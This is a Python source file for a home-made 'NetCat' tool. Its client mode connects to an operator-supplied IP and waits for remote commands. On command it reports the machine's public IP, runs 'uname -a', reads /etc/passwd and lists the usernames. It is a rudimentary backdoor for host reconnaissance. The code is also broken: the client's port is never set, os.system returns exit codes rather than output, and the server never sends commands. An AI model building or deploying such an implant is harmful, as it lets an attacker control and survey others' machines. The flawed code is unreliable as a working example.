import os
from threading import Thread
import socket
import subprocess
from requests import get


class NetCat:
    def __init__(self, mode: str):
        if mode == "server":
            self.ServerMode()
        elif mode == "client":
            self.ClientMode()
        else:
            print("   [!]The following input is invalid mode.\nplease choose valid mode(server/client).")

    def ServerMode(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Ip = input("   [*]What ip do you want to listen on? ")
        self.PortNumber = int(input("   [*]What port do you to listen on? "))

        self.sock.bind((Ip, self.PortNumber))
        print("   [*]Socket has been bound successfully")

        self.sock.listen(1)
        print("   [*]Socket has been initiated, looking for incoming connection...\n")
        sock_handler, IP = self.sock.accept()

    def ClientMode(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        Ip = input("   [*]Enter ip to connect: ")
        self.sock.connect((Ip, self.PortNumber))
        print("   [*]Socket has been initialized and connected to end point host.")
        IsStoped = True

        while IsStoped:
            buffer = self.sock.recv(4096).decode()

            if buffer == "bye":
                IsStoped = False
            elif buffer == "get ip":
                ip = get('https://api.ipify.org').content.decode('utf8')
                self.sock.send(f'My public IP address is: {ip}'.encode())
            elif buffer == "get os":
                self.sock.send(f"{os.system('uname -a')}".encode())
            elif buffer == "get all users" and os.name != 'nt':
                self.sock.send(f"{os.system('cat /etc/passwd')}".encode())
            elif buffer == "get all users plain":
                self.sock.send(f"{os.system('cut -d: -f1 /etc/passwd')}".encode())
